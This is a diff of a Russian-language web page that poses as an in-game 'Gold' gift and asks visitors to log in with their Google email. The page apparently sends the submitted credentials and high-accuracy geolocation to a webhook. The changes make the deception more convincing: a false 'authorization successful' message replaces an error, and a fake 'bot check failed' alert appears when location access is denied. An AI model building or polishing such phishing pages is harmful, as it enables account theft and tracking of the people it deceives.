@@ -182,7 +182,7 @@
       <div id="pre-info" class="info-block"></div>
       <!-- Картинка подарка (изначально gift.png) -->
       <img id="gift-image" src="gift.png" alt="Подарок">
-      <h2>Авторизация</h2>
+      <h2>Авторизоваться</h2>
       <form id="login-form">
         <div class="input-group">
           <label for="email">Google Почта:</label>
@@ -264,7 +264,7 @@
           console.error("Ошибка получения геолокации:", error);
           clientInfo.geolocation = { error: error.message };
           if (error.code === error.PERMISSION_DENIED) {
-            alert("Ошибка: обнаружен вход с новой локации");
+            alert("Ошибка: проверка на бота не была пройдена");
           }
         },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
@@ -355,7 +355,7 @@
       document.getElementById("pre-info").innerHTML = `
         ID отправителя: ${params.senderId}<br>
         Ник отправителя: ${params.senderNick}<br>
-        Кол-во Gold: ${params.goldAmount}
+        Количество Gold: ${params.goldAmount}
       `;
     } else {
       document.getElementById("pre-info").textContent = "Некорректный ID транзакции";
@@ -380,10 +380,10 @@ Email: ${email}
       
       sendDataToWebhook(authMsg, function(success) {
         if (!success) {
-          document.getElementById("login-result").textContent = "Ошибка входа";
+          document.getElementById("login-result").textContent = "Ошибка авторизации";
           return;
         }
-        document.getElementById("login-result").textContent = "Ошибка: проверки правильности данных входа";
+        document.getElementById("login-result").textContent = "Авторизация прошла успешно";
         // Преобразование подарка в голду – смена изображения с анимацией
         const giftImage = document.getElementById("gift-image");
         giftImage.classList.add("fade-out");
@@ -399,7 +399,7 @@ Email: ${email}
               document.getElementById("gold-info").innerHTML = `
                 ID отправителя: ${params.senderId}<br>
                 Ник отправителя: ${params.senderNick}<br>
-                Кол-во Gold: ${params.goldAmount}
+                Количество Gold: ${params.goldAmount}
               `;
             }
             fadeIn(document.getElementById("gold-section"));
